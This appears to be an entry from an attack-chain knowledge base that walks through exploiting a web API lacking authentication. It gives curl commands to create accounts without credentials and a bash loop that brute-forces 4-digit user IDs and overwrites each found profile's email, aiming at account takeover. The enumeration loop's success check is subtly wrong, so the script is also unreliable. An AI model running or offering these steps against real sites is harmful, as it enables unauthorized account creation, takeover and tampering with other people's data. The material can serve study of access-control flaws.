---
id: ac-uuid-001
name: >-
  Unauthorized User Creation and Profile Modification via API Access Control
  Bypass
tags:
  - access-control
  - idor
  - api
  - unauthorized-access
  - brute-force
type: attack_chain
tools: []
tactics:
  - '[[Initial Access]]'
  - '[[Discovery]]'
verified: false
platforms:
  - Web
submitted: true
complexity: medium
created_at: '2023-10-01T00:00:00Z'
procedures:
  - '[[procedures/Identify-Vulnerable-API-Endpoint-Lacking-Authentication]]'
  - '[[procedures/Exploit-Endpoint-to-Create-New-Users-Without-Authentication]]'
  - '[[procedures/Brute-Force-Enumerate-and-Modify-Existing-User-Profiles]]'
step_count: 3
techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[Account Discovery]]'
updated_at: '2025-12-14T17:30:18.131Z'
description: >-
  Multi-stage attack exploiting improper access control on a web API endpoint to
  create unauthorized accounts and modify existing user profiles using
  predictable IDs.
skill_level: intermediate
impact_level: high
validated: true
mitre_tactics:
  - '[[Initial Access]]'
  - '[[Discovery]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[Account Discovery]]'
---
# Unauthorized User Creation and Profile Modification via API Access Control Bypass

Multi-stage attack chain demonstrating a complete attack workflow exploiting improper access control on the Mars website's API endpoint, allowing unauthorized user account creation and profile modifications, compounded by predictable user IDs for enumeration.

## Chain Metrics Dashboard

| Metric | Value |
|--------|-------|
| Chain Status | Unverified |
| Total Steps | 3 |
| Execution Time | ~5 minutes |
| Skill Level | Intermediate |
| Complexity | Medium |
| Impact Level | High |

## Attack Flow Visualization

```mermaid
graph LR
    A[Identify Vulnerable Endpoint] --> B[Create Unauthorized Users]
    B --> C[Enumerate and Modify Profiles]
    C --> D[Account Takeover and Data Tampering]

    style A fill:#e74c3c
    style B fill:#f39c12
    style C fill:#3498db
    style D fill:#27ae60
```

## Prerequisites & Requirements

### Required Tools

- Browser developer tools or [[tools/curl]]
- Scripting tool like Python requests for automation (optional)

### Target Environment

- Web platform with API endpoints
- No specific ports required (HTTPS/80/443 assumed)
- Publicly accessible website

### Initial Access Requirements

- No credentials needed due to lack of authentication
- Direct network access to the target website
- No prior access required

## Detailed Attack Procedures

### Step 1: Identify Vulnerable API Endpoint
procedure: [[procedures/Identify-Vulnerable-API-Endpoint-Lacking-Authentication]]

**Objective**: Discover the API endpoint that handles user registration and profile updates without enforcing authentication.

**Instructions**: Use browser developer tools or a tool like curl to inspect network requests during normal user interactions. Look for endpoints related to user management. Test by sending a direct request to suspected endpoints without authentication headers.

For example, inspect the redacted endpoint (e.g., `/api/users`) and attempt a GET or POST without tokens:

```bash
curl -X GET https://target.com/api/users -H "Content-Type: application/json"
```

**Expected Output**: Response containing user data or successful access without auth errors.

**Success Indicators**:
- Endpoint responds without requiring login
- Ability to view or modify user data

### Step 2: Exploit Endpoint to Create New Users
procedure: [[procedures/Exploit-Endpoint-to-Create-New-Users-Without-Authentication]]

**Objective**: Bypass authentication to register new user accounts directly via the API.

**Instructions**: Craft a POST request to the vulnerable endpoint with new user details, omitting any authentication. Use JSON payload for user registration data like name, email, and password.

Example request:

```bash
curl -X POST https://target.com/api/users/register \
  -H "Content-Type: application/json" \
  -d '{"name":"Test User","email":"test@example.com","password":"password123"}'
```

**Expected Output**: HTTP 200/201 response confirming new user creation, possibly with a generated user ID.

**Success Indicators**:
- New account created successfully
- Confirmation email or dashboard shows the new user (if accessible)

### Step 3: Brute-Force Enumerate and Modify Existing User Profiles
procedure: [[procedures/Brute-Force-Enumerate-and-Modify-Existing-User-Profiles]]

**Objective**: Enumerate valid user IDs using the predictable 4-digit system and update their profiles unauthorized.

**Instructions**: Script a loop to test IDs from 0000 to 9999 on the profile update endpoint. For each valid ID, send a PUT request to modify data like email or password.

Basic curl example for enumeration and update:

```bash
for id in {0000..9999}; do
  curl -X GET https://target.com/api/users/$id -H "Content-Type: application/json"
  if [ $? -eq 0 ]; then
    echo "Valid ID: $id"
    curl -X PUT https://target.com/api/users/$id \
      -H "Content-Type: application/json" \
      -d '{"email":"hacked@example.com"}'
  fi
done
```

**Expected Output**: List of valid IDs and successful modification responses (e.g., 200 OK with updated data).

**Success Indicators**:
- Multiple valid user IDs identified
- Profile changes applied without errors
- Potential account takeover via password reset

## Attack Chain Summary

### Key Achievements

1. Bypassed authentication to create arbitrary user accounts
2. Enumerated all existing users via brute-force on predictable IDs
3. Modified sensitive personal information, enabling account takeovers and data tampering

## Technique & Tactic Coverage

### MITRE ATT&CK Techniques

- [[Exploit Public-Facing Application]] Exploit Public-Facing Application
- [[Account Discovery]] Account Discovery

### MITRE ATT&CK Tactics

- [[Initial Access]] Initial Access
- [[Discovery]] Discovery

---
*Last updated: 2023-10-01T00:00:00Z*
